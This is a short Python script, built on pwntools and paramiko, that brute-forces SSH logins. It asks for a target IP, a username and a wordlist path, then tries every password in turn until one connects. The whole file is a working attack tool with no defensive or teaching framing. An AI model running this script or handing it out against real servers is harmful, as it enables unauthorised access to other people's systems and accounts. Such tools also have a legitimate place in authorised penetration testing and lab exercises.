from pwn import *
import paramiko

host = input("Enter the IP: ")
username = input("Enter the username: ")
attempts = 0
password_file = input("Specify the password file path: ")
with open(password_file, "r") as file:
    try:    
        for password in file:
            password = password.strip()  
            try:
                print("[{}] Attempting password: '{}'".format(attempts, password))
                response = ssh(host=host, user=username, password=password, timeout=1)

                if response.connected():
                    print("[>] Valid password found: '{}'".format(password))
                    response.close()  
                    break

                response.close() 

            except Exception as e:
                print("[X] Invalid password")

            attempts += 1
    except KeyboardInterrupt:
        print("\n[!] Process interrupted by user. Exiting...")